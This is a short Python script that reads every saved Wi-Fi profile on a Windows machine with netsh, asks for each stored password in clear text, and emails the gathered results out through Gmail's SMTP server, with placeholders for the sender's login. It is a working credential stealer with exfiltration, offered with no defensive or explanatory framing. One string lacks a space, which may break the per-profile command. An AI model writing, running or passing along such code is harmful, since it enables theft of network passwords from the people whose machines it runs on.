import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_name_list = re.findall(b"(?:Profile\s*:\s)(.*)", networks)

result = b""

for network_name in network_name_list:
    command = "netsh wlan show profile" + network_name.decode("UTF-8") + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("your email", "your password", result.decode("UTF-8"))